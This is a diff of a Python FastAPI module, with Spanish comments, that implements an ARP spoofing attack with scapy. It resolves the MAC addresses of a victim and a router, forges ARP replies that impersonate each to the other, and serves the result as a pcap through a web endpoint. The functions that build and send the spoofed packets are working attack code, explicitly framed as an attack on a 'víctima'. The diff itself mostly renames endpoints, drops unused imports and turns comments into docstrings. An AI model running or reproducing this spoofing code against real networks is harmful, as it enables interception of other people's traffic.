@@ -1,25 +1,21 @@
 import subprocess
-import sys
 import os
-import re
 import tempfile
 import scapy.all as scapy
 
-from fastapi import FastAPI, UploadFile, File, HTTPException, Query, APIRouter, Request, Form
+from fastapi import HTTPException, APIRouter, Request, Form
 from fastapi.responses import FileResponse, HTMLResponse
 from fastapi.templating import Jinja2Templates
 
 router = APIRouter()
 templates = Jinja2Templates(directory="app/templates")
 
-# Cambia esto por tu interfaz adecuada (la que tiene tu IP LAN)
-
+# ----------------------------------------
+#  Funciones internas
+# ----------------------------------------
 def detect_physical_iface():
-    """
-    Devuelve automáticamente la interfaz Npcap
-    que tenga dirección IP en una red privada.
-    Funciona para cualquier IP y cualquier interfaz física.
-    """
+    """ que tenga dirección IP en una red privada. Funciona para cualquier IP y cualquier interfaz física."""
+    
     private_prefixes = ("192.168.", "10.", "172.")
 
     for iface in scapy.get_if_list():
@@ -31,33 +27,27 @@ def detect_physical_iface():
             pass
     return None
 
-# ------------------------------------------------------------
-# Obtener MAC usando ARP request + fallback a tabla ARP Windows
-# ------------------------------------------------------------
 def get_mac(ip, iface):
-    print(f"[*] Resolviendo MAC de {ip} ...")
-
-    pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
-    ans = scapy.srp(pkt, iface=iface, timeout=2, verbose=False)[0]
+    """ Obtener MAC usando ARP request + fallback a tabla ARP Windows """
+    
+    pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip) # hace un broadcast buscando un equipo con la ip que se le pasa
+    ans = scapy.srp(pkt, iface=iface, timeout=2, verbose=False)[0] # aqui se obtiene la mac
 
     if ans:
         mac = ans[0][1].hwsrc
         return mac
-
+    
+    # si falla, buscar por tabla arp
     output = subprocess.check_output("arp -a", text=True)
     for line in output.splitlines():
         if ip in line:
             mac = line.split()[1].replace("-", ":")
             return mac
-
-    # print(f"[!] No se pudo obtener la MAC de {ip}")
     return None
 
-
-# ------------------------------------------------------------
-# ARP Spoof Correcto (Ethernet + ARP)
-# ------------------------------------------------------------
 def build_spoof_packets(victim_ip, victim_mac, router_ip, router_mac):
+    """ ARP Spoof Correcto (Ethernet + ARP) """
+    
     # Paquete que engaña a la víctima fingiendo ser el router
     pkt_to_victim = scapy.Ether(dst=victim_mac) / scapy.ARP(
         op=2,
@@ -76,19 +66,16 @@ def build_spoof_packets(victim_ip, victim_mac, router_ip, router_mac):
 
     return pkt_to_victim, pkt_to_router
 
-
-# ------------------------------------------------------------
-# Generación de PCAP y envío continuo hasta Ctrl+C
-# ------------------------------------------------------------
 def generate_pcap(victim_ip, router_ip, iface):
+    """ Generación de PCAP y envío continuo """
+    
     victim_mac = get_mac(victim_ip, iface)
     router_mac = get_mac(router_ip, iface)
 
     if not victim_mac or not router_mac:
         raise RuntimeError("No se pudieron obtener todas las MAC.")
-
-    print("[*] Iniciando ataque ARP... Ctrl+C para detener.")
-
+    
+    # inicio del ataque
     packets = []
     i = 0
     while i < 50:
@@ -107,19 +94,16 @@ def generate_pcap(victim_ip, router_ip, iface):
 # ----------------------------------------
 #  Endpoints FastAPI
 # ----------------------------------------
-
 @router.get("/op_arp", response_class=HTMLResponse, tags=["op_arp"])
-async def cargar_pagina_portscan(request: Request):
+async def arp_page(request: Request):
         return templates.TemplateResponse("arp.html", {"request": request})
     
 
 @router.post("/op_arp", response_class=FileResponse, tags=["op_arp"])
-async def mutar_pcap(
+async def arp_execute(
     ip_victima: str = Form(None, description="IP victima"),
     ip_router: str = Form(None, description="IP router")
-):
-    """Recibe un pcap, genera un nuevo pcap 'de ataque' y lo devuelve."""
-    
+):  
     # Crear archivo de salida temporal
     out_fd, out_path = tempfile.mkstemp(suffix=".pcap")
     os.close(out_fd)
